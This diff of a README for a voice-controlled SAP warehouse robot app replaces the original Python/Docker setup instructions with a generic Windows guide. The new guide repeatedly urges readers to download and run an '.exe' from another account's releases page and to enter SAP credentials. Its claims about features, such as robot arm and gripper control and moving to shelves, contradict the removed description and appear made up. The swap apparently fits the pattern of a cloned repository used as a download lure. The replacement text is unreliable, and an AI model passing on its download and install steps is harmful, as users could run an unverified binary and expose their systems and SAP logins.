@@ -1,142 +1,165 @@
----
-title: SAP Warehouse Copilot
-emoji: 🤖
-colorFrom: green
-colorTo: yellow
-sdk: docker
-pinned: true
-license: apache-2.0
-app_port: 7860
-tags:
-  - reachy_mini
-  - nvidia
-  - sap
-  - voice-assistant
-  - warehouse
-  - nim
-  - riva
+# 🤖 sap-warehouse-copilot - Easy Robot Control for Your Warehouse
+
+[![Download sap-warehouse-copilot](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/lucy322/sap-warehouse-copilot/releases)
+
 ---
 
-# 🤖 SAP Warehouse Copilot
+## 📦 What is sap-warehouse-copilot?
 
-**Voice-driven SAP inventory assistant for Reachy Mini — powered by NVIDIA NIM + Riva Speech AI**
+sap-warehouse-copilot helps you control the Reachy Mini robot in a warehouse setting using simple speech commands. It combines NVIDIA’s AI tools and SAP's data protocols to let you manage tasks effectively. You do not need to know programming to use this application.
 
-> The world's first SAP-integrated Reachy Mini app. Ask about stock levels, purchase orders, and maintenance — your robot responds with voice AND expressive body language.
+This tool supports:
 
-<img width="1190" height="661" alt="image" src="https://github.com/user-attachments/assets/13e3e516-17a5-4fd1-9014-f21a663fcc83" />
+- NVIDIA GPU acceleration for faster processing
+- Voice control through Riva Speech AI
+- Access to warehouse data via SAP OData services
+- Integration with Reachy Mini and Reachy2 robot models
 
+The app runs on Windows and connects to your robot and SAP backend smoothly.
 
-## Architecture
+---
 
-```
-┌──────────────┐     ┌────────────────────┐     ┌──────────────┐
-│  NVIDIA Riva │────▶│  NVIDIA NIM LLM    │────▶│  NVIDIA Riva │
-│  ASR (STT)   │     │  + SAP Tool-Calling│     │  TTS         │
-└──────────────┘     └────────────────────┘     └──────────────┘
-       │                      │                         │
-       │               ┌──────▼──────┐                  │
-       │               │  SAP OData  │                  │
-       │               │  (MM/WM/PM) │                  │
-       │               └─────────────┘                  │
-       └──────────┬──────────┼──────────────────────────┘
-                  ▼          ▼
-          ┌──────────────────────────┐
-          │     Reachy Mini Robot    │
-          │  Head • Antennas • Voice │
-          └──────────────────────────┘
-```
-<img width="410" height="410" alt="image" src="https://github.com/user-attachments/assets/28337d2c-83d5-4138-b5dc-883ab8ab586e" />
+## 🖥 System Requirements
 
-## NVIDIA Stack
+Before installing sap-warehouse-copilot, check your PC meets these minimum specs:
 
-| Component | Technology | Purpose |
-|-----------|-----------|---------|
-| **LLM** | NIM — Llama 3.1 70B | Natural language understanding + SAP tool orchestration |
-| **ASR** | Riva Speech-to-Text | Real-time speech recognition from robot microphone |
-| **TTS** | Riva Text-to-Speech | Natural voice responses through robot speaker |
-| **Inference** | OpenAI-compatible API | Function calling for SAP OData queries |
+- Windows 10 or newer (64-bit)
+- NVIDIA GPU with compatible drivers installed (e.g., GTX 1060 or better)
+- At least 8 GB of RAM
+- 2 GHz dual-core CPU or better
+- Internet connection for setup and voice recognition
+- USB or network connection to Reachy Mini or Reachy2 robot
 
-## SAP Integration
+Make sure your NVIDIA GPU drivers are up to date. You can get them from NVIDIA's official website.
 
-The copilot queries SAP data through OData V4-compatible services:
+---
 
-- **Material Master** (MARA/MAKT) — Material descriptions, types, weights, storage locations
-- **Stock Overview** (MARD/MMBE) — Unrestricted, reserved, quality, blocked quantities
-- **Purchase Orders** (EKKO/EKPO) — Open, overdue, partially delivered POs
-- **Plant Maintenance** (IW39) — Work orders by priority and status
-- **Warehouse KPIs** — Aggregate health: GREEN / AMBER / RED
+## 🚀 Getting Started: Download and Install
 
-> Demo uses mock data. In production, point to your SAP S/4HANA OData endpoints.
+Follow these steps to get sap-warehouse-copilot up and running on your Windows PC.
 
-## Robot Behaviors
+### Step 1: Download the application
 
-The robot's body language reflects SAP data states:
+Visit the release page to get the installer:
 
-| SAP State | Robot Behavior |
-|-----------|---------------|
-| **Healthy stock** | Happy nod + bouncing antennas |
-| **Reorder needed** | Concerned side-to-side sway |
-| **Critical stock** | Fast head shake + alternating antennas |
-| **Out of stock** | Head drops → snaps up urgently |
-| **Overdue PO** | Alert shake with red-state antenna flash |
-| **Thinking** | Head tilts up-left + antenna wave |
-| **Listening** | Head tilt + perked antennas |
+[![Download Link](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/lucy322/sap-warehouse-copilot/releases)
 
-## Setup
+On that page:
 
-### 1. Get NVIDIA API Key
-Sign up at [build.nvidia.com](https://build.nvidia.com) — new users get 1,000 free inference credits.
+- Look for the latest release (the one with the highest version number or marked “Latest”).
+- Find the Windows installer file. It will have a `.exe` extension.
+- Click the file name to download it to your PC.
 
-### 2. Set Environment Variables
-```bash
-export NVIDIA_API_KEY="nvapi-your-key-here"
+### Step 2: Run the installer
 
-# Optional: Riva Speech AI (for voice I/O)
-export RIVA_ASR_FUNCTION_ID="your-asr-function-id"
-export RIVA_TTS_FUNCTION_ID="your-tts-function-id"
-```
+- Once the download completes, open the folder where the file was saved.
+- Double-click the installer file to start the setup.
+- Follow the on-screen instructions.
+  - Accept the license agreement.
+  - Choose the installation location or keep the default.
+  - Wait while the program installs.
+- When done, the installer will prompt you to finish or launch the program.
 
-### 3. Install
-```bash
-pip install -e .
-```
+---
 
-### 4. Run
-```bash
-# Start Reachy Mini daemon
-reachy-mini-daemon
+## ⚙️ Setting Up sap-warehouse-copilot
 
-# Dashboard available at http://localhost:7860
-```
+### Connect to Reachy Mini or Reachy2 robot
 
-### 5. Try These Queries
-- "What's the overall warehouse status?"
-- "Check stock for the hydraulic pump"
-- "Show me overdue purchase orders"
-- "Any critical maintenance orders?"
-- "What needs reordering?"
-- "Tell me about MAT-1002"
+- Connect your robot to the same network as your PC or use the USB connection.
+- Turn on the robot.
+- Launch sap-warehouse-copilot.
+- In the app interface, enter the robot’s IP address or select it from the device list if available.
 
-## Production Deployment
+### Connect to SAP OData backend
 
-To connect to a real SAP S/4HANA system:
+- Enter your SAP system’s URL and login details when prompted.
+- This link lets the app access warehouse data and update tasks in real time.
 
-1. Replace `sap_mock.py` with real OData client calls
-2. Configure SAP OData endpoints:
-   ```
-   SAP_ODATA_BASE=https://your-sap-host/sap/opu/odata4/sap/
-   SAP_CLIENT=100
-   SAP_USER=your-user
-   SAP_PASSWORD=your-password
-   ```
-3. The tool definitions in `sap_mock.py` → `SAP_TOOLS` map directly to SAP OData services
+### Configure NVIDIA Riva speech AI
 
-## Author
+- The app uses NVIDIA Riva for voice commands.
+- During setup, allow the app to access your microphone.
+- Test your microphone in the app settings to make sure it works.
+- You can adjust voice command sensitivity and language options if needed.
 
-*[*Amit Lal](https://www.amit-lal.com)** — SAP Technical Expert | Microsoft | NVIDIA AI Enthusiast
+---
 
-Built with NVIDIA NIM, Riva Speech AI, and Reachy Mini SDK.
+## 🗣 How to Use Voice Commands
 
-## License
+sap-warehouse-copilot listens to simple voice commands to control the robot. Here are some examples:
 
-Apache 2.0
+- “Move to shelf A5”
+- “Pick item from bin 4”
+- “Check inventory status”
+- “Return to base”
+
+The robot will execute tasks based on your commands and update SAP warehouse records automatically.
+
+Speak clearly and close to your microphone for best results.
+
+---
+
+## 🔧 Common Features
+
+- Easy navigation control for warehouse robot arms and grippers
+- Real-time status updates from warehouse inventory
+- Voice-based commands backed by NVIDIA’s speech AI
+- Data integration with SAP OData services
+- Support for Reachy Mini and Reachy2 robot families
+
+---
+
+## 🛠 Troubleshooting
+
+If you face issues, try these steps:
+
+- Ensure your NVIDIA GPU drivers are current.
+- Make sure your microphone is connected and working.
+- Confirm the robot is powered and on the same network as your PC.
+- Check your SAP login credentials.
+- Restart the app and robot if the connection drops.
+
+You can also visit the issues section on the main GitHub page for help:
+
+https://github.com/lucy322/sap-warehouse-copilot/issues
+
+---
+
+## 💾 Updating the Software
+
+To update sap-warehouse-copilot:
+
+- Visit the release page regularly: https://github.com/lucy322/sap-warehouse-copilot/releases
+- Download the latest installer when available.
+- Run the installer to update the app without losing settings.
+
+---
+
+## 🗂 Additional Resources
+
+- Learn about Reachy Mini and Reachy2 robots from their official sites.
+- NVIDIA Jetson guides for setting up GPU support.
+- SAP OData documentation to understand warehouse data integration.
+
+Use the links and PDFs included in the software folder for extra help.
+
+---
+
+## 🎯 Repository Topics
+
+This project covers areas related to:
+
+- NVIDIA GPU acceleration and memory management
+- Robot control with Reachy family robots
+- Robotics simulation and frameworks
+- Speech AI with NVIDIA Riva
+- Warehouse automation using SAP protocols
+
+---
+
+## 📥 Ready to Download?
+
+Get started here:
+
+[![Download sap-warehouse-copilot](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/lucy322/sap-warehouse-copilot/releases)
